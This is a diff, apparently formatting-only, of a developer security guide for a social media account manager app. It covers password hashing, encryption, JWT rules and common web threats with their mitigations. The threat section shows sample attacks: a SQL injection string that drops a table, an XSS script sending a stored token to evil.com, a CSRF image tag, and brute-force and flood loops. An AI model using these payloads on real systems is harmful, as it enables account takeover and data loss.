@@ -7,6 +7,7 @@ Panduan keamanan dan best practices untuk Social Media Account Manager.
 ### Password Security
 
 #### User Passwords (Authentication)
+
 - **Algorithm**: bcryptjs with 10 salt rounds
 - **Storage**: Hashed in `users.password_hash`
 - **Verification**: Constant-time comparison
@@ -21,6 +22,7 @@ const hash = await bcrypt.hash(password, 4);
 ```
 
 #### Social Account Passwords
+
 - **Algorithm**: AES-256-GCM (Web Crypto API)
 - **Key**: Raw 32-byte key derived directly from `ENCRYPTION_KEY` (64 hex chars, 32 bytes)
 - **IV**: Random 12 bytes per encryption, prepended
@@ -33,10 +35,11 @@ const combined = iv(12) + ciphertext + authTag(16);
 const encrypted = btoa(String.fromCharCode(...combined));
 
 // Example
-"7x8y9z0aAb1C..."
+('7x8y9z0aAb1C...');
 ```
 
 **Why separate encryption?**
+
 - User passwords: One-way hash (bcrypt) - cannot decrypt
 - Account passwords: Reversible encryption (AES-GCM) - can decrypt when needed
 
@@ -75,6 +78,7 @@ const encrypted = btoa(String.fromCharCode(...combined));
 ### Security Rules
 
 ✅ **DO:**
+
 - Verify signature on every request
 - Check expiration (`exp` claim)
 - Use HTTPS in production
@@ -83,6 +87,7 @@ const encrypted = btoa(String.fromCharCode(...combined));
 - Treat localStorage token as XSS-exposed
 
 ❌ **DON'T:**
+
 - Store sensitive data in payload
 - Use weak secrets
 - Skip signature verification
@@ -97,22 +102,22 @@ const encrypted = btoa(String.fromCharCode(...combined));
 ### 1. SQL Injection
 
 **Attack:**
+
 ```sql
 '; DROP TABLE users; --
 ```
 
 **Mitigation:**
+
 - ✅ Use Drizzle ORM (parameterized queries)
 - ✅ Never concatenate user input into SQL
 - ✅ Validate all inputs with Zod
 
 **Example (Safe):**
+
 ```typescript
 // Drizzle automatically parameterizes
-const user = await db
-  .select()
-  .from(users)
-  .where(eq(users.email, userInput)); // Safe
+const user = await db.select().from(users).where(eq(users.email, userInput)); // Safe
 ```
 
 ---
@@ -120,17 +125,22 @@ const user = await db
 ### 2. XSS (Cross-Site Scripting)
 
 **Attack:**
+
 ```html
-<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>
+<script>
+  fetch('https://evil.com?token=' + localStorage.getItem('token'));
+</script>
 ```
 
 **Mitigation:**
+
 - ✅ React escapes content by default
 - ✅ Never use `dangerouslySetInnerHTML` with user input
 - ✅ Set CSP headers
 - ✅ Sanitize user-generated content
 
 **CSP Headers:**
+
 ```typescript
 contentSecurityPolicy: {
   defaultSrc: ["'self'"],
@@ -144,17 +154,20 @@ contentSecurityPolicy: {
 ### 3. CSRF (Cross-Site Request Forgery)
 
 **Attack:**
+
 ```html
-<img src="https://victim.com/api/projects?delete=all">
+<img src="https://victim.com/api/projects?delete=all" />
 ```
 
 **Mitigation:**
+
 - ✅ JWT in Authorization header (not cookies)
 - ✅ SameSite cookies (if using cookies)
 - ✅ Verify Origin header
 - ✅ CSRF tokens not needed for Bearer auth
 
 **Current Protection:**
+
 - Token stored in localStorage
 - Transmitted via header (not auto-sent like cookies)
 - Attacker cannot read token due to same-origin policy
@@ -164,6 +177,7 @@ contentSecurityPolicy: {
 ### 4. Brute Force (Login)
 
 **Attack:**
+
 ```bash
 # Try 1000 passwords
 for pass in $(cat passwords.txt); do
@@ -172,12 +186,14 @@ done
 ```
 
 **Mitigation:**
+
 - ✅ Rate limiting: 10 attempts per 15 minutes per IP
 - ✅ Bcrypt slows down verification (~300ms per attempt)
 - ⚠️ Account lockout (planned)
 - ⚠️ CAPTCHA (planned)
 
 **Current Implementation:**
+
 ```typescript
 // Rate limit map: IP -> [timestamp, count]
 const rateLimitMap = new Map<string, [number, number]>();
@@ -193,16 +209,19 @@ if (count > 10) {
 ### 5. Man-in-the-Middle (MITM)
 
 **Attack:**
+
 - Intercept HTTP traffic
 - Read JWT tokens
 - Steal passwords
 
 **Mitigation:**
+
 - ✅ Use HTTPS in production (Cloudflare auto-enforces)
 - ✅ HSTS headers (Cloudflare auto-adds)
 - ✅ No mixed content (all assets over HTTPS)
 
 **Cloudflare Protection:**
+
 - TLS 1.3
 - Certificate auto-renewal
 - HTTP → HTTPS redirect
@@ -212,6 +231,7 @@ if (count > 10) {
 ### 6. Password Enumeration
 
 **Attack:**
+
 ```bash
 # Check if email exists
 curl -X POST /api/auth/login -d '{"email":"test@example.com","password":"wrong"}'
@@ -222,6 +242,7 @@ curl -X POST /api/auth/register -d '{"email":"test@example.com",...}'
 ```
 
 **Mitigation:**
+
 - ✅ Generic error messages ("Invalid credentials")
 - ⚠️ Rate limiting helps
 - ⚠️ Timing attacks (bcrypt time varies - acceptable trade-off)
@@ -231,16 +252,19 @@ curl -X POST /api/auth/register -d '{"email":"test@example.com",...}'
 ### 7. Session Hijacking
 
 **Attack:**
+
 - Steal JWT token via XSS/MITM
 - Use token to impersonate user
 
 **Mitigation:**
+
 - ✅ HTTPS only
 - ✅ Short token expiry (7 days)
 - ⚠️ Refresh tokens (planned)
 - ⚠️ Token revocation (planned; needs state store)
 
 **Future Enhancement:**
+
 ```typescript
 // Store refresh token in httpOnly cookie
 // Short-lived access token (15 min)
@@ -252,6 +276,7 @@ curl -X POST /api/auth/register -d '{"email":"test@example.com",...}'
 ### 8. Denial of Service (DoS)
 
 **Attack:**
+
 ```bash
 # Flood API with requests
 while true; do
@@ -260,12 +285,14 @@ done
 ```
 
 **Mitigation:**
+
 - ✅ Cloudflare DDoS protection (automatic)
 - ✅ Rate limiting on auth endpoints
 - ✅ Workers CPU limit (prevents infinite loops)
 - ✅ D1 query timeout
 
 **Cloudflare Protection:**
+
 - 100M+ requests/second capacity
 - Challenge suspicious traffic
 - Geographic blocking
@@ -276,12 +303,12 @@ done
 
 ### Encryption at Rest
 
-| Data Type | Storage | Encryption |
-|-----------|---------|------------|
-| User passwords | D1 SQLite | bcrypt hash (irreversible) |
-| Account passwords | D1 SQLite | AES-256-GCM (reversible) |
-| JWT tokens | Client localStorage | Signed (HS256) |
-| Database files | Cloudflare D1 | Encrypted at rest (Cloudflare) |
+| Data Type         | Storage             | Encryption                     |
+| ----------------- | ------------------- | ------------------------------ |
+| User passwords    | D1 SQLite           | bcrypt hash (irreversible)     |
+| Account passwords | D1 SQLite           | AES-256-GCM (reversible)       |
+| JWT tokens        | Client localStorage | Signed (HS256)                 |
+| Database files    | Cloudflare D1       | Encrypted at rest (Cloudflare) |
 
 ### Encryption in Transit
 
@@ -332,6 +359,7 @@ wrangler secret put ENCRYPTION_KEY
 4. Update ENCRYPTION_KEY secret
 
 **Script (TODO):**
+
 ```bash
 npm run rotate-encryption-key
 ```
@@ -495,18 +523,18 @@ If you find a security issue:
 
 ## Status
 
-| Area | Status |
-|------|--------|
-| Password hashing | implemented |
+| Area                        | Status      |
+| --------------------------- | ----------- |
+| Password hashing            | implemented |
 | Account password encryption | implemented |
-| JWT auth | implemented |
-| Rate limiting | implemented |
-| CSP headers | planned |
-| Refresh tokens | planned |
-| Token revocation | planned |
-| Account lockout | planned |
-| CAPTCHA | planned |
-| Audit logs | planned |
+| JWT auth                    | implemented |
+| Rate limiting               | implemented |
+| CSP headers                 | planned     |
+| Refresh tokens              | planned     |
+| Token revocation            | planned     |
+| Account lockout             | planned     |
+| CAPTCHA                     | planned     |
+| Audit logs                  | planned     |
 
 **Current Security Grade: B+**
 
